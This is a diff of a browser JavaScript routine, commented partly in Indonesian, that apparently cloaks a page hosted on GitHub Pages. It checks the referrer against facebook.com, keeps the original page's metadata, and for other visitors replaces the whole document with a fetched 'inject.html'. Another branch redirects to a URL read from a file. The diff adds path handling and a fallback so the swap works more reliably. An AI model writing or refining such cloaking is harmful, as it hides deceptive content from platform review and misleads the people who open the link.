@@ -47,17 +47,25 @@
         injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
         location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
       } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
-        // Cross-browser compatible approach for fetching inject.html
+        // GitHub Pages optimized approach for loading inject.html
         const loadInjectHTML = () => {
-          // Use XMLHttpRequest for maximum browser compatibility
+          // Get the repository name from the URL for GitHub Pages path resolution
+          const pathSegments = window.location.pathname.split('/');
+          const repoName = pathSegments[1] === '' ? '' : '/' + pathSegments[1];
+          
+          // Use XMLHttpRequest with proper GitHub Pages path handling
           const xhr = new XMLHttpRequest();
           const timestamp = new Date().getTime();
-          const injectPath = window.location.origin + '/inject.html?nocache=' + timestamp;
+          
+          // For GitHub Pages, we need to ensure the path starts with the repo name
+          // If running locally or at root domain, this will still work
+          const injectPath = window.location.origin + repoName + '/inject.html?nocache=' + timestamp;
+          
+          console.log('Attempting to fetch from:', injectPath);
           
           xhr.open('GET', injectPath, true);
           xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
           xhr.setRequestHeader('Pragma', 'no-cache');
-          xhr.setRequestHeader('Expires', '0');
           
           xhr.onload = function() {
             if (xhr.status >= 200 && xhr.status < 300) {
@@ -65,41 +73,68 @@
               
               if (!html || html.trim() === '') {
                 console.error('Fetched inject.html is empty');
-                alert('Failed to load content. Please refresh the page.');
+                // Try alternative path if empty
+                tryAlternativePath();
                 return;
               }
               
-              console.log('Inject HTML fetched successfully');
-              
-              try {
-                // Replace document content
-                document.open();
-                document.write(html);
-                document.close();
-                
-                // Inject metadata after DOM replacement
-                setTimeout(() => {
-                  injectMetadata(originalHtml);
-                  console.log('Metadata injection complete');
-                }, 200); // Increased timeout for slower browsers
-              } catch (e) {
-                console.error('Error replacing document content:', e);
-              }
+              console.log('Inject HTML successfully loaded');
+              processHTML(html);
             } else {
-              console.error('Failed to fetch inject.html:', xhr.status, xhr.statusText);
-              alert('Failed to load content. Please try again later.');
+              console.error('Failed to fetch inject.html:', xhr.status);
+              tryAlternativePath();
             }
           };
           
           xhr.onerror = function() {
             console.error('Network error while fetching inject.html');
-            alert('Network error. Please check your connection and try again.');
+            tryAlternativePath();
           };
           
           xhr.send();
         };
         
-        // Execute the function to load inject.html
+        // Try alternative path if the first attempt fails
+        const tryAlternativePath = () => {
+          console.log('Trying alternative path for inject.html');
+          const xhr = new XMLHttpRequest();
+          const timestamp = new Date().getTime();
+          // Try relative path as fallback
+          xhr.open('GET', './inject.html?nocache=' + timestamp, true);
+          xhr.onload = function() {
+            if (xhr.status >= 200 && xhr.status < 300) {
+              const html = xhr.responseText;
+              if (html && html.trim() !== '') {
+                console.log('Inject HTML loaded from alternative path');
+                processHTML(html);
+              } else {
+                console.error('All attempts to load inject.html failed');
+                alert('Failed to load content. Please check your connection.');
+              }
+            }
+          };
+          xhr.send();
+        };
+        
+        // Process the HTML content once loaded
+        const processHTML = (html) => {
+          try {
+            // Replace document content
+            document.open();
+            document.write(html);
+            document.close();
+            
+            // Inject metadata after DOM replacement
+            setTimeout(() => {
+              injectMetadata(originalHtml);
+              console.log('Metadata injection complete');
+            }, 200);
+          } catch (e) {
+            console.error('Error processing HTML:', e);
+          }
+        };
+        
+        // Start the loading process
         loadInjectHTML();
       }
     })
